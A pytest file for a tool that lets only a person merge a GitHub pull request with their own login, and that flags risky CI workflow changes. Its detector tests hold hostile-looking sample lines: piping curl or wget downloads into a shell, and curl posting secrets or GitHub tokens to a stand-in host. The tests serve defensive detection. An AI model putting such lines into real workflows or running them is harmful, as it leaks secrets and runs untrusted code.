"""A merge card: `orch ask ... --link T --open <PR> --merge`. The person's Merge click (CLI, dashboard or a
paired phone, all through review.decide) merges the pull request with the person's own GitHub login: helper
token variables are dropped, and only a person's click merges. A refused merge saves no answer."""

import json
import os
import subprocess

import pytest

from orch import ghmerge, review, tickets

PR = "https://github.com/acme/app/pull/12"
HEAD = "a" * 40
ME = "human:pat"
# what gh printed on 22 Nov 00:25 when GitHub refused the connection (ORCH-1415)
REFUSED_CONNECTION = (
    'Post "https://api.github.com/graphql": dial tcp 140.82.121.6:443: connect: connection refused\n'
)


class FakeGh:
    """Stands in for the gh command line: records every call and the token variables it was given."""

    def __init__(self, state="OPEN", merge_rc=0, merge_err="", login="pat-gh", user_rc=0):
        self.calls, self.envs, self.review, self.head = [], [], "", HEAD
        self.state, self.merge_rc, self.merge_err = state, merge_rc, merge_err
        self.login, self.user_rc = login, user_rc
        self.files = None  # the changed files GitHub's compare lists for the card's commit (None: refused)
        self.whole = {}  # {workflow name: its text at the card's commit} (ORCH-429; missing: not found)
        self.rollup = []  # statusCheckRollup that `gh pr view --json statusCheckRollup` answers
        self.summary = (
            None  # what `gh pr view --json title,...` answers when the card is made (None: refused)
        )
        self.offline = 0  # ORCH-1415: this many next gh calls get no answer (GitHub refuses the connection)
        self.review_err = ""  # #1764: GitHub refuses the APPROVE review with this text
        self.lost = 0  # this many next merges land on GitHub but their answer gets lost on the way back

    def __call__(self, argv, env=None, **kw):
        args = argv[1:]
        self.calls.append(args)
        env = os.environ if env is None else env  # no env= given: the process environment
        self.envs.append({k: env[k] for k in ghmerge.TOKEN_VARS if k in env})
        if self.offline:
            self.offline -= 1
            return subprocess.CompletedProcess(argv, 1, "", REFUSED_CONNECTION)
        if self.lost and args[:2] == ["pr", "merge"]:
            self.lost -= 1
            self.state = "MERGED"
            return subprocess.CompletedProcess(argv, 1, "", REFUSED_CONNECTION)
        if args[:2] == ["api", "user"]:
            return subprocess.CompletedProcess(argv, self.user_rc, self.login + "\n", "")
        if args[:2] == ["pr", "view"] and "title,baseRefName,headRefOid,commits,statusCheckRollup" in args:
            if self.summary is None:
                return subprocess.CompletedProcess(argv, 1, "", "not found")
            return subprocess.CompletedProcess(argv, 0, json.dumps(self.summary), "")
        if args[:2] == ["pr", "view"] and args[3:] == ["--json", "baseRefName"]:
            if self.files is None:
                return subprocess.CompletedProcess(argv, 1, "", "not found")
            return subprocess.CompletedProcess(argv, 0, json.dumps({"baseRefName": "develop"}), "")
        if args[:2] == ["api", f"repos/acme/app/compare/develop...{self.head}"]:
            return subprocess.CompletedProcess(argv, 0, json.dumps(self.files), "")
        if args[0] == "api" and args[1].startswith("repos/acme/app/contents/"):
            name, _, ref = args[1].removeprefix("repos/acme/app/contents/").partition("?ref=")
            if ref == self.head and name in self.whole:
                return subprocess.CompletedProcess(argv, 0, self.whole[name], "")
            return subprocess.CompletedProcess(argv, 1, "", "Not Found")
        if args[:2] == ["pr", "view"] and args[3:] == ["--json", "statusCheckRollup"]:
            return subprocess.CompletedProcess(argv, 0, json.dumps({"statusCheckRollup": self.rollup}), "")
        if args[:2] == ["pr", "view"]:
            return subprocess.CompletedProcess(argv, 0, f"{self.state}\t{self.review}\t{self.head}\n", "")
        if args[:3] == ["api", "-X", "POST"]:
            if self.review_err:
                return subprocess.CompletedProcess(argv, 1, "", self.review_err)
            self.review = "APPROVED"
            return subprocess.CompletedProcess(argv, 0, "{}", "")
        if args[:2] == ["pr", "merge"]:
            if self.merge_rc == 0:
                self.state = "MERGED"
            return subprocess.CompletedProcess(argv, self.merge_rc, "", self.merge_err)
        raise AssertionError(args)

    @property
    def merges(self):
        return [c for c in self.calls if c[:2] == ["pr", "merge"]]


@pytest.fixture
def gh(monkeypatch):
    fake = FakeGh()
    monkeypatch.setattr(ghmerge.shutil, "which", lambda name: "/fake/bin/gh" if name == "gh" else None)
    monkeypatch.setattr(ghmerge.subprocess, "run", fake)
    monkeypatch.setenv("GH_TOKEN", "helper-token-value")
    monkeypatch.setenv("GITHUB_TOKEN", "helper-token-value")
    FakeGh.current = fake
    return fake


@pytest.fixture
def tk(proj, run, gh):
    code, out, _ = run("ticket", "new", "Release 27", "--json", "--by", "agent:x")
    assert code == 0
    return proj, json.loads(out)["id"]


def _ask(run, tid, *extra):
    got = _ask_only(run, tid, *extra)
    FakeGh.current.calls.clear()  # reading the pull request when the card is made is not the merge
    FakeGh.current.envs.clear()
    return got


def _ask_only(run, tid, *extra):
    return run(
        "ask", tid, "Merge release 27 into main?", "--link", "Release 27", "--open", PR, "--merge",
        "--then", "Release 27 goes to main.", *extra, "--json", "--by", "agent:x",
    )  # fmt: skip


def _q(root, tid, qid="q1"):
    return next(x for x in tickets.load(root, tid)["questions"] if x["id"] == qid)


def test_ask_makes_a_link_card_with_merge(tk, run, validate):
    root, tid = tk
    code, out, err = _ask(run, tid)
    assert code == 0, out + err
    q = _q(root, tid)
    assert q["card"]["kind"] == "link" and q["card"]["ok_label"] == "Merge"
    assert q["card"]["open"] == PR and "own GitHub login" in q["card"]["why"]
    assert q["action"] == {"merge": PR, "head": HEAD} and review.merge_url(q) == PR
    assert q.get("kind") in (None, "plain")  # stays on the person's Review stack
    validate(tickets.load(root, tid))
    code, out, _ = run("review", "list", "--json")
    assert [c["key"] for c in json.loads(out)["cards"] if c["ticket"] == tid] == ["q1"]


@pytest.mark.parametrize(
    "argv",
    [
        ["--link", "T", "--open", "https://example.com/x", "--merge"],  # not a pull request
        ["--link", "T", "--open", "https://github.com/acme/app/issues/3", "--merge"],
        ["--draft", "T", "--merge"],  # only a link card merges
        ["--merge"],  # no card at all
    ],
)
def test_merge_needs_a_link_card_on_a_pull_request(tk, run, argv):
    root, tid = tk
    code, out, err = run("ask", tid, "Merge?", *argv, "--then", "x", "--by", "agent:x")
    assert code == 2 and "--merge goes with" in out + err
    assert tickets.load(root, tid)["questions"] == []


def test_person_click_merges_with_own_login_and_saves_the_answer(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    d = tickets.question_digest(_q(root, tid))
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--digest", d, "--by", ME)
    assert code == 0, out + err
    assert gh.merges == [["pr", "merge", PR, "--merge", "--match-head-commit", HEAD]]
    assert all(e == {} for e in gh.envs)  # the helper's tokens never reach gh: its own sign-in merges
    q = _q(root, tid)
    assert q["answer"] == "Merge" and q["answered_by"] == ME
    hist = [h["text"] for h in tickets.load(root, tid)["history"]]
    assert f"Merged the pull request on GitHub as pat-gh: {PR}" in hist


def test_not_now_merges_nothing(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    code, *_ = run("review", "answer", tid, "q1", "--verdict", "no", "--by", ME)
    assert code == 0 and gh.calls == []
    assert _q(root, tid)["decision"]["action"] == "dont"


def test_refused_merge_is_sent_back_to_the_helper_with_the_reason(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.merge_rc, gh.merge_err = (
        1,
        "X Pull request acme/app#12 is not mergeable: the base branch policy prohibits the merge.\n",
    )
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    q = _q(root, tid)
    assert q["answer"] is not None and q["decision"]["action"] == "send_back"
    change = q["decision"]["changes"][0]
    assert "Merge failed on GitHub, please fix it:" in change and "base branch policy prohibits" in change
    assert "Open the pull request and merge it there." not in change
    assert len(gh.merges) == 1


def test_only_a_person_merge_refusal_still_refuses(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", "agent:claude")
    assert code == 2 and _q(root, tid)["answer"] is None


def test_running_checks_hold_the_merge_and_save_no_answer(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.rollup = [
        {"name": "lint", "status": "COMPLETED", "conclusion": "SUCCESS", "workflowName": "ci"},
        {"name": "tests", "status": "IN_PROGRESS", "conclusion": "", "workflowName": "ci"},
    ]
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 2
    assert "1 of 2 checks still running" in out + err and "nothing was merged" in out + err
    assert gh.merges == [] and _q(root, tid)["answer"] is None
    gh.rollup[1].update(status="COMPLETED", conclusion="SUCCESS")
    assert run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)[0] == 0
    assert len(gh.merges) == 1


def test_already_merged_is_not_merged_twice(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.state = "MERGED"
    assert run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)[0] == 0
    assert gh.merges == []
    hist = [h["text"] for h in tickets.load(root, tid)["history"]]
    assert f"The pull request was merged already on GitHub (pat-gh): {PR}" in hist


def test_closed_pull_request_and_no_gh_say_what_to_do(tk, run, gh, monkeypatch):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.state = "CLOSED"
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 2 and "closed on GitHub" in out + err and gh.merges == []
    gh.state, gh.user_rc = "OPEN", 1  # gh not signed in
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 2 and "signed in with your own account" in out + err
    monkeypatch.setattr(ghmerge.shutil, "which", lambda name: None)
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 2 and "(gh)" in out + err
    assert _q(root, tid)["answer"] is None and gh.merges == []


def test_an_agent_never_merges(tk, run, gh, monkeypatch):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    q = _q(root, tid)
    with pytest.raises(tickets.Refused, match="Only a person merges this"):
        review.decide(root, tid, "q1", "ok", by="agent:x", via="cli")
    code, out, _ = run("review", "answer", tid, "q1", "--verdict", "ok", "--json")
    assert code == 2 and json.loads(out)["code"] == "needs_person"
    monkeypatch.setattr(tickets, "agent_tool", lambda: "claude")  # a human: label inside an agent's run
    with pytest.raises(tickets.Refused, match="Only a person merges this"):
        review.decide(root, tid, "q1", "ok", by=ME, via="cli")
    # plain `orch answer` never records a merge answer without the merge
    with pytest.raises(tickets.Refused, match="answer it on the card"):
        tickets.answer(
            root, tid, "q1", "Merge", ME, "cli", expected_question_digest=tickets.question_digest(q)
        )
    assert gh.calls == [] and _q(root, tid)["answer"] is None


def test_a_paired_phone_answer_merges_even_when_a_helper_reads_the_inbox(tk, run, gh, monkeypatch):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    monkeypatch.setattr(tickets, "agent_tool", lambda: "claude")
    out = review.decide(root, tid, "q1", "ok", by="human:Pat iPhone", via="phone")
    assert out["answer"] == "Merge" and gh.merges == [
        ["pr", "merge", PR, "--merge", "--match-head-commit", HEAD]
    ]
    assert all(e == {} for e in gh.envs)


def test_changed_card_is_refused_before_any_merge(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--digest", "0" * 64, "--by", ME)
    assert code == 2 and gh.calls == []


def test_change_after_not_now_merges_and_a_merge_cannot_be_taken_back(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    assert run("review", "answer", tid, "q1", "--verdict", "no", "--by", ME)[0] == 0
    assert run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)[0] == 0
    assert len(gh.merges) == 1
    newest = tickets.load(root, tid)["questions"][-1]
    assert newest["decision"]["action"] == "approve" and newest["decision"]["replaces"] == "q1"
    code, out, err = run("review", "answer", tid, newest["id"], "--verdict", "no", "--by", ME)
    assert code == 2 and "cannot be taken back" in out + err


def test_a_required_review_is_the_persons_own_before_the_merge(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.review = "REVIEW_REQUIRED"
    assert run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)[0] == 0
    acts = [c[:2] for c in gh.calls]
    assert acts == [["api", "user"], ["pr", "view"], ["pr", "view"], ["api", "-X"], ["pr", "merge"]]
    assert gh.calls[3][:4] == ["api", "-X", "POST", "repos/acme/app/pulls/12/reviews"]
    assert f"commit_id={HEAD}" in gh.calls[3] and "event=APPROVE" in gh.calls[3]
    assert all(e == {} for e in gh.envs)


def test_a_refused_review_is_said_not_only_the_branch_policy(tk, run, gh):
    """#1764: the review call failed silently; the person only saw 'base branch policy prohibits the merge'"""
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.review = "REVIEW_REQUIRED"
    gh.review_err = "Can not approve your own pull request (HTTP 422)"
    gh.merge_rc, gh.merge_err = 1, "the base branch policy prohibits the merge"
    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, out + err
    change = _q(root, tid)["decision"]["changes"][0]
    assert "did not add your review (Can not approve your own pull request (HTTP 422))" in change
    assert "base branch policy prohibits" in change


def test_no_review_when_none_is_required(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    gh.review = "APPROVED"
    assert run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)[0] == 0
    assert ["api", "-X"] not in [c[:2] for c in gh.calls]


def test_a_hand_made_merge_action_never_merges(tk, run, gh):
    root, tid = tk
    code, out, err = run("ask", tid, "Ok?", "--action", json.dumps({"merge": PR}), "--by", "agent:x")
    assert code == 2 and "A merge goes with a link card" in out + err
    # a card whose shown address differs from the merged one is no merge card
    assert _ask(run, tid)[0] == 0
    q = _q(root, tid)
    assert (
        review.merge_url({**q, "card": {**q["card"], "open": "https://github.com/acme/app/pull/99"}}) is None
    )
    assert review.merge_url({**q, "card": {**q["card"], "ok_label": "Looks good"}}) is None
    assert review.merge_url({**q, "card": {**q["card"], "kind": "draft"}}) is None
    assert review.merge_url({**q, "card": None}) is None and review.merge_url(q) == PR


def test_merge_button_always_says_merge(tk, run):
    root, tid = tk
    assert _ask(run, tid, "--ok", "Ship it")[0] == 0
    q = _q(root, tid)
    assert q["card"]["ok_label"] == "Merge" and review.merge_url(q) == PR


def test_card_shows_and_pins_the_newest_commit(tk, run, gh):
    root, tid = tk
    assert _ask(run, tid)[0] == 0
    q = _q(root, tid)
    assert q["action"] == {"merge": PR, "head": HEAD}
    assert q["card"]["preview"] == {
        "type": "doc",
        "heading": "Pull request",
        "foot": f"Exact version: {HEAD[:7]}",
    }
    assert PR not in json.dumps(q["card"]["preview"]), "the address is the Open link, not the content"
    assert q["card"]["open"] == PR


def test_a_release_card_shows_what_goes_out_and_the_checks(tk, run, gh):
    """ORCH-183, owner 17 Nov: a Merge card shows what the person decides on, not the address."""
    root, tid = tk
    code, out, _ = run("ticket", "new", "Review on desktop", "--json", "--by", "agent:x")
    other = json.loads(out)["id"]
    assert run("ref", "add", other, "https://github.com/acme/app/pull/7", "--by", "agent:x")[0] == 0
    ok = {
        "status": "COMPLETED",
        "conclusion": "SUCCESS",
        "workflowName": "ci",
        "name": "build",
        "startedAt": "1",
    }
    gh.summary = {
        "title": "Release 32",
        "baseRefName": "main",
        "headRefOid": HEAD,
        "commits": [
            {"messageHeadline": "Merge pull request #7 from acme/feat/x", "messageBody": "Bigger pictures"},
            {"messageHeadline": "Fix a typo", "messageBody": ""},
            {
                "messageHeadline": "Merge pull request #9 from acme/fix/y",
                "messageBody": "Send back asks for words\n\nmore",
            },
        ],
        "statusCheckRollup": [ok, {**ok, "name": "lint"}],
    }
    assert _ask(run, tid)[0] == 0
    pv = _q(root, tid)["card"]["preview"]
    key = tickets.load(root, other)["key"]
    assert pv["heading"] == "What goes out · 2 changes"
    assert pv["rows"] == [
        {"title": "Bigger pictures", "n": 7, "key": key},
        {"title": "Send back asks for words", "n": 9},
        {"title": "and 1 other commit"},
    ], "GitHub's own titles, the linked ticket beside it, and the commits that are no pull request"
    assert pv["status"]["tone"] == "done" and pv["status"]["text"].startswith(
        "All 2 checks passed · checked "
    )
    assert "paras" not in pv, "all green: no warning lines"
    assert pv["foot"] == f"Exact version: {HEAD[:7]}"
    wire = review.wire_card(_q(root, tid)["card"], {})
    review.check_wire_card(wire, 0)  # still a valid phone card: the rows and status become plain lines
    assert wire["preview"]["steps"][0] == f"Bigger pictures (#7, {key})"
    assert wire["preview"]["paras"][0].startswith("All 2 checks passed")


def test_a_failed_check_turns_the_status_red_and_says_why(tk, run, gh):
    root, tid = tk
    bad = {
        "status": "COMPLETED",
        "conclusion": "FAILURE",
        "workflowName": "ci",
        "name": "lint",
        "startedAt": "1",
    }
    gh.summary = {
        "title": "Release 33",
        "baseRefName": "main",
        "headRefOid": HEAD,
        "statusCheckRollup": [bad],
        "commits": [{"messageHeadline": "Merge pull request #9 from acme/fix/y", "messageBody": "Y"}],
    }
    assert _ask(run, tid)[0] == 0
    pv = _q(root, tid)["card"]["preview"]
    assert pv["status"]["tone"] == "failed" and pv["status"]["text"].startswith("1 check failed: lint")
    assert pv["paras"][0] == "Merging now would put work live that failed a check."
    assert "may have changed" in pv["paras"][1]


def test_a_summary_of_another_commit_or_a_file_never_replaces_it(tk, run, gh, tmp_path):
    root, tid = tk
    gh.summary = {
        "title": "Release 33",
        "baseRefName": "main",
        "headRefOid": "c" * 40,
        "commits": [],
        "statusCheckRollup": [],
    }
    assert _ask(run, tid)[0] == 0
    assert "rows" not in _q(root, tid)["card"]["preview"], "read for another commit: only the pinned one"


def test_checks_in_plain_words():
    run_ = {"status": "COMPLETED", "conclusion": "SUCCESS", "workflowName": "ci", "startedAt": "1"}
    assert ghmerge.checks_state([]) == ("working", "No checks have run yet")
    assert ghmerge.checks_state([{**run_, "name": "a"}, {**run_, "name": "b"}]) == (
        "done",
        "All 2 checks passed",
    )
    two = [{**run_, "name": "a"}, {"status": "IN_PROGRESS", "name": "b"}]
    assert ghmerge.checks_state(two) == ("working", "1 of 2 checks still running")
    assert ghmerge.checks_state([{**run_, "name": "a", "conclusion": "FAILURE"}]) == (
        "failed",
        "1 check failed: a",
    )


def test_a_doc_box_takes_status_rows_and_foot_only_in_shape():
    pv = {
        "type": "doc",
        "status": {"tone": "done", "text": "Fine"},
        "rows": [{"title": "One", "n": 3, "key": "ORCH-1"}],
    }
    ok = {"kind": "draft", "title": "T", "then": "x", "preview": {**pv, "foot": "v"}}
    review.validate_card(json.loads(json.dumps(ok)))
    for bad in ({"tone": "pink", "text": "x"}, {"tone": "done"}, "Fine"):
        with pytest.raises(review.Refused):
            review.validate_card({**ok, "preview": {**ok["preview"], "status": bad}})
    for bad in ([{"n": 3}], [{"title": "x", "n": -1}], [{"title": "x", "url": "https://x"}], "rows"):
        with pytest.raises(review.Refused):
            review.validate_card({**ok, "preview": {**ok["preview"], "rows": bad}})


# ---- ORCH-305: a pull request that changes a CI workflow ----

WF = ".github/workflows/addons.yml"


def _wf_file(*added, name=WF, status="modified"):
    patch = "@@ -1,2 +1,4 @@\n jobs:\n" + "".join(f"+{x}\n" for x in added)
    return {"filename": name, "status": status, "additions": len(added), "deletions": 0, "patch": patch}


def test_a_plain_workflow_change_says_it_was_checked():
    wf = ghmerge.check_workflows(
        [_wf_file("  pr-tests:", "    timeout-minutes: 10", "    steps:", "      - uses: actions/checkout@v4",
                  "      - run: echo ${{ secrets.GITHUB_TOKEN }}"),
         {"filename": "workspace/src/orch/x.py", "additions": 3, "deletions": 1, "patch": "+secrets.KEY"}]
    )  # fmt: skip
    assert wf["files"] == [{"name": WF, "add": 5, "del": 0}]
    assert wf["findings"] == ["uses a token (GITHUB_TOKEN)"]  # ORCH-429: tokens are named, GitHub's own too
    assert wf["safe"] is False  # the whole file was not read
    plain = ghmerge.check_workflows([_wf_file("    timeout-minutes: 10")])
    assert plain["findings"] == [] and ghmerge.workflow_words(plain) == (
        "Workflow check: no new secrets, tokens, permissions, outside actions, risky triggers or downloads "
        "run in a shell in added lines."
    )


def test_no_workflow_file_is_no_workflow_check():
    assert ghmerge.check_workflows([{"filename": ".github/CODEOWNERS", "patch": "+x"}]) is None
    assert ghmerge.check_workflows("not a list") is None


@pytest.mark.parametrize(
    ("line", "words"),
    [
        ("      - run: curl -d ${{ secrets.DEPLOY_KEY }} x", "reads a secret (DEPLOY_KEY)"),
        ("      env: ${{ toJSON(secrets) }}", "reads a secret (all secrets)"),
        ("    permissions: write-all", "changes what a job may do on GitHub (permissions)"),
        ("      contents: write", "changes what a job may do on GitHub (permissions)"),
        ("  job: {permissions: {contents: read}}", "changes what a job may do on GitHub (permissions)"),
        ("    steps: [{uses: someone/x@v1}]", "uses an action from outside GitHub: someone/x@v1"),
        ('      - "uses": "someone/y@v2"', "uses an action from outside GitHub: someone/y@v2"),
        ("    secrets: inherit", "passes all secrets on"),
        ("      - uses: someone/action@v1", "uses an action from outside GitHub: someone/action@v1"),
        ("      env: {GH_TOKEN: x}", "uses a token (GH_TOKEN)"),
        ('      - run: gh api -H "Authorization: ${{ github.token }}"', "uses a token (github.token)"),
        ("      - run: curl -fsSL https://get.example.dev | bash", "runs a download straight in a shell"),
        ("      - run: wget -qO- https://x.dev/i.sh | sudo -E sh -s", "runs a download straight in a shell"),
        ("      - run: bash <(curl -s https://x.dev/i.sh)", "runs a download straight in a shell"),
        ("      - run: curl -s https://x.dev/i.py | python3 -", "runs a download straight in a shell"),
        (
            "  pull_request_target:",
            "runs on pull_request_target, which has more rights than a pull request run",
        ),
    ],
)
def test_each_risky_added_line_is_named(line, words):
    assert ghmerge.check_workflows([_wf_file(line)])["findings"] == [words]


def test_removed_lines_and_own_actions_are_not_findings():
    f = _wf_file("      - uses: ./.github/actions/setup", "      - uses: github/codeql-action/init@v3")
    f["patch"] += "-      - run: echo ${{ secrets.OLD }}\n-    permissions: write-all\n"
    assert ghmerge.check_workflows([f])["findings"] == []


def test_a_workflow_without_a_patch_says_open_it_and_a_removed_one_does_not():
    big = {"filename": WF, "status": "modified", "additions": 900, "deletions": 0}
    gone = {"filename": ".github/workflows/old.yml", "status": "removed", "additions": 0, "deletions": 40}
    assert ghmerge.check_workflows([big, gone])["findings"] == [
        "addons.yml is too big to check here: open it"
    ]


def test_the_merge_card_of_a_workflow_change_shows_the_check_first(tk, run, gh):
    root, tid = tk
    gh.files = [_wf_file("      - uses: someone/action@v1")]
    code, out, err = _ask(run, tid)
    assert code == 0, err
    card = _q(root, tid)["card"]
    pv = card["preview"]
    assert (
        pv["paras"][0]
        == "Workflow check, look at this: uses an action from outside GitHub: someone/action@v1."
    )
    assert pv["rows"][0] == {"title": f"{WF} (+1 −0)"}
    assert "GitHub waits for you to approve it" in card["why"]
    assert PR + "/files" in json.dumps(_q(root, tid))


def test_the_click_on_a_workflow_card_approves_that_commit_then_merges(tk, run, gh):
    root, tid = tk
    gh.files = [_wf_file("    timeout-minutes: 10")]
    gh.review = "REVIEW_REQUIRED"  # the develop rule wants the code owner's review
    _ask(run, tid)
    code, _, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, err
    posts = [c for c in gh.calls if c[:3] == ["api", "-X", "POST"]]
    assert posts and f"commit_id={HEAD}" in posts[0] and gh.merges


def test_a_rule_set_asks_for_the_review_without_saying_so_and_the_click_still_approves(tk, run, gh):
    root, tid = tk
    gh.files = [_wf_file("    timeout-minutes: 10")]
    gh.review = ""  # a rule set's code-owner review: GitHub gives no review decision at all
    _ask(run, tid)
    code, _, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, err
    posts = [c for c in gh.calls if c[:3] == ["api", "-X", "POST"]]
    assert posts and f"commit_id={HEAD}" in posts[0] and gh.merges


def test_no_review_is_added_when_nothing_asks_for_one(tk, run, gh):
    root, tid = tk
    gh.files = [{"filename": "README.md", "additions": 1, "deletions": 0, "patch": "+x"}]
    gh.review = ""
    _ask(run, tid)
    code, _, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
    assert code == 0, err
    assert not [c for c in gh.calls if c[:3] == ["api", "-X", "POST"]] and gh.merges


def test_a_card_without_a_workflow_file_is_as_before(tk, run, gh):
    root, tid = tk
    gh.files = [{"filename": "README.md", "additions": 1, "deletions": 0, "patch": "+x"}]
    _ask(run, tid)
    card = _q(root, tid)["card"]
    assert "paras" not in card["preview"] and card["why"].startswith("Your click merges it")


def test_a_changed_local_action_counts_and_is_named():
    act = _wf_file("    - uses: someone/z@v1", name=".github/actions/setup/action.yml")
    wf = ghmerge.check_workflows([act])
    assert wf["files"][0]["name"] == ".github/actions/setup/action.yml"
    assert wf["findings"] == [
        "changes an action the workflows run: .github/actions/setup/action.yml",
        "uses an action from outside GitHub: someone/z@v1",
    ]


# ORCH-429 (owner 18 Nov): the card shows the changed lines, marks risky ones red, and a script check labels a
# harmless change "Safe to merge" (words only: the owner still clicks Merge).
READ_ONLY = "on: pull_request\npermissions:\n  contents: read\njobs:\n  t:\n    runs-on: ubuntu-latest\n"


def test_a_download_into_a_file_is_not_a_download_run_in_a_shell():
    assert (
        ghmerge.check_workflows([_wf_file("      - run: curl -fsSLo tool.tgz https://x.dev/t.tgz")])[
            "findings"
        ]
        == []
    )


def test_the_changed_lines_come_with_their_file_and_the_risky_ones_are_marked():
    f = _wf_file("    timeout-minutes: 30", "          KEY: ${{ secrets.DEPLOY_KEY }}")
    f["patch"] += "-    timeout-minutes: 20\n+\n"
    wf = ghmerge.check_workflows([f])
    assert wf["lines"] == [
        {"op": "+", "text": "    timeout-minutes: 30", "file": WF},
        {"op": "+", "text": "          KEY: ${{ secrets.DEPLOY_KEY }}", "file": WF, "risk": "secret"},
        {"op": "-", "text": "    timeout-minutes: 20", "file": WF},
    ]  # an empty added line is left out
    assert wf["lines_more"] == 0 and wf["safe"] is False


def test_a_long_change_keeps_every_marked_line_in_its_order():
    added = [f"    # line {i}" for i in range(40)] + ["      - run: curl -s https://x.dev | sh"]
    wf = ghmerge.check_workflows([_wf_file(*added)])
    assert len(wf["lines"]) == ghmerge.MAX_LINES and wf["lines_more"] == 11
    assert wf["lines"][-1]["risk"] == "download run in a shell"
    assert wf["lines"][0]["text"] == "    # line 0"


def test_a_read_only_workflow_with_harmless_added_lines_is_safe_to_merge():
    f = _wf_file("    timeout-minutes: 30", "      - run: make test")
    wf = ghmerge.check_workflows([f], {WF: READ_ONLY + "      - run: echo ${{ secrets.GITHUB_TOKEN }}\n"})
    assert wf["safe"] is True  # GitHub's own token already in a read-only file is fine
    assert ghmerge.workflow_words(wf).startswith("Safe to merge: ")
    # adding a permissions block that only reads keeps it safe
    assert ghmerge.check_workflows([_wf_file("permissions:", "  contents: read")], {WF: READ_ONLY})["safe"]


@pytest.mark.parametrize(
    ("whole", "added"),
    [
        (READ_ONLY.replace("read", "write"), "    timeout-minutes: 30"),  # the job may write
        (READ_ONLY.replace("permissions:\n  contents: read\n", ""), "    timeout-minutes: 30"),  # not said
        (READ_ONLY + "    env: {K: '${{ secrets.K }}'}\n", "    timeout-minutes: 30"),  # reads a secret
        (READ_ONLY.replace("pull_request", "pull_request_target"), "    timeout-minutes: 30"),
        (None, "    timeout-minutes: 30"),  # GitHub did not give the file
        (READ_ONLY, "      - uses: someone/x@v1"),  # an outside action added
        (READ_ONLY, "      env: {NPM_TOKEN: x}"),  # a token other than GitHub's own
        (READ_ONLY, "      - run: curl -s https://x.dev | sh"),
        (READ_ONLY, "      - run: curl -d ${{ github.token }} https://x.dev"),  # even GitHub's own token
        (READ_ONLY, "      env: {K: '${{ SECRETS.K }}'}"),  # expressions ignore case
        (READ_ONLY.replace("permissions:", "  permissions:"), "    timeout-minutes: 30"),  # not at the top
        (READ_ONLY + '      contents: "wr\\u0069te"\n', "    timeout-minutes: 30"),  # an escape
        (READ_ONLY + "      - run: curl -s u \\\n          | bash\n", "    timeout-minutes: 30"),
        (READ_ONLY + "      - run: curl -so x.sh u\n", "    timeout-minutes: 30"),  # any download at all
        (
            'name: "x\npermissions: read"\n'
            + READ_ONLY.replace("permissions:\n  contents: read\n", "")
            + "  w:\n    permissions: write-all\n".replace("write-all", "{}"),
            "    timeout-minutes: 30",
        ),
        (READ_ONLY + "x: &w write\n", "    timeout-minutes: 30"),  # an anchor
        (READ_ONLY + "      contents: !!str write\n", "    timeout-minutes: 30"),  # a tag
        (READ_ONLY.replace("contents: read", "contents: >\n    write"), "    timeout-minutes: 30"),  # folded
        (READ_ONLY + "      - run: echo 'x\n", "    timeout-minutes: 30"),  # an open single quote
        (READ_ONLY + "      env: {A: 1,\n", "    timeout-minutes: 30"),  # a flow mapping over lines
        (READ_ONLY + "---\npermissions: write-all\n".replace("write-all", "{}"), "    timeout-minutes: 30"),
    ],
)
def test_anything_risky_takes_the_safe_label_away(whole, added):
    assert ghmerge.check_workflows([_wf_file(added)], {WF: whole})["safe"] is False


@pytest.mark.parametrize(
    "line",
    [
        "curl u | env bash",
        "curl u | tee /tmp/p | bash",
        'curl u | "bash"',
        "wget -qO- u | sudo -E python3.12 -",
    ],
)
def test_more_ways_to_run_a_download_in_a_shell(line):
    assert (
        "runs a download straight in a shell"
        in ghmerge.check_workflows([_wf_file(f"      - run: {line}")])["findings"]
    )


@pytest.mark.parametrize("token", ["API_TOKEN_2", "npm_token", "TOKEN", "github['token']"])
def test_more_token_names(token):
    assert ghmerge.check_workflows([_wf_file(f"      env: {{X: ${{{{ {token} }}}}}}")])["findings"]


def test_a_removed_workflow_is_never_safe():
    gone = {"filename": ".github/workflows/scan.yml", "status": "removed", "additions": 0, "deletions": 40}
    plain = _wf_file("    timeout-minutes: 30")
    assert ghmerge.check_workflows([plain, gone], {WF: READ_ONLY})["safe"] is False


def test_a_long_risky_line_keeps_both_ends():
    wf = ghmerge.check_workflows([_wf_file("      - run: echo " + "x" * 300 + " ${{ secrets.K }}")])
    assert wf["lines"][0]["text"].endswith("${{ secrets.K }}") and len(wf["lines"][0]["text"]) <= 200


